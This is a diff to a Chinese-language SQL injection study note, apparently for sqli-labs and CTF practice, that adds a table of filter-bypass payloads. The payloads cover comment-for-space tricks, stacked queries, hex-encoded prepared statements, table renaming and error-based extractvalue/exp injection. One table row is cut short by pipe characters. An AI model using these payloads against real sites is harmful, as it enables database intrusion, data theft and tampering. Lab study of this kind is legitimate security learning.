@@ -197,6 +197,27 @@ sqlmap -u "http://localhost/Less-10/?id=1" \
 
 
 
+## #绕过技巧：
+
+| **拦截项 (被过滤)** | **替代方案 (绕过)**    | **具体用法 / Payload 示例**                                  | **备选/下一个方案 (如果不行)**                               |
+| ------------------- | ---------------------- | ------------------------------------------------------------ | ------------------------------------------------------------ |
+| **空格**            | `/**/` 或 `()`         | `1'/**/union/**/select...` `select(password)from(users)`     | `%0a` (换行符) 或 `%09` (Tab)                                |
+| **and / or**        | `&&` / `||` 或 `^`     | `1                                                           |                                                              |
+| **union / select**  | **堆叠注入 (Stacked)** | `1;show/**/tables;`                                          | `handler` 或 `TABLE` 关键字 (MySQL 8.0+)                     |
+| **from**            | **无 From 注入**       | **查看列名**: `show/**/columns/**/in/**/Flag;` **查数据**: `*,1` (利用逻辑或拼接) | **Rename 法**: `rename/**/table/**/Flag/**/to/**/tmp;`       |
+| **flag (关键字)**   | **通配符 \***          | `select/**/*/from/**/Flag` (配合 `*,1` 逻辑)                 | **Hex 编码**: `set/**/@a=0x(hex字符串);prepare/**/s/**/from/**/@a;` |
+| **like / regexp**   | **直接大小比较**       | `database()>0x61` (比较字典序)                               | `strcmp(str1,str2)` (比较函数)                               |
+| **substr / for**    | **字符串函数**         | `left(database(),1)='s'` `mid(database()/**/from/**/1/**/for/**/1)` | **直接 Hex 比较**: `database()>0x616161`                     |
+| **updatexml**       | **其他报错函数**       | `extractvalue(1,concat(0x7e,database()))`                    | `exp(~(select*from(select/**/database())a))`                 |
+| **handler**         | **预处理语句**         | `prepare/**/s/**/from/**/0x(hex数据);execute/**/s;`          | **Rename 法** 顶替原本查询的表名                             |
+| **长度限制**        | **极致压缩**           | `1;desc/**/Flag` (代替 `show columns`)                       | **分段 Set**: 先多次 `set/**/@a=concat(@a,...)`              |
+
+
+
+---
+
+
+
 ## #数字型：
 
 ```
@@ -302,10 +323,6 @@ $sql = "SELECT * FROM news WHERE id = ("$id")";
 
 
 4
-
-
-
-
 
 
 
